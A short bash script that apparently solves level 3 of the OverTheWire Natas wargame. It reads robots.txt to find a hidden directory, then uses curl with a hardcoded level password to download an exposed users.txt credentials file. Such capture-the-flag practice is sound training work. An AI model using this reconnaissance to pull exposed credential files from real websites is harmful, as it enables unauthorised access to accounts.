#!/bin/bash

# This challgne hints that google will not be able to find it
# hinting at the robots.txt

USER=natas3
PASS='3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'

echo "/robots.txt"
curl -fsSL -u $USER:$PASS http://natas3.natas.labs.overthewire.org/robots.txt

echo "/s3cr3t/users.txt"
curl -fsSL -u $USER:$PASS http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
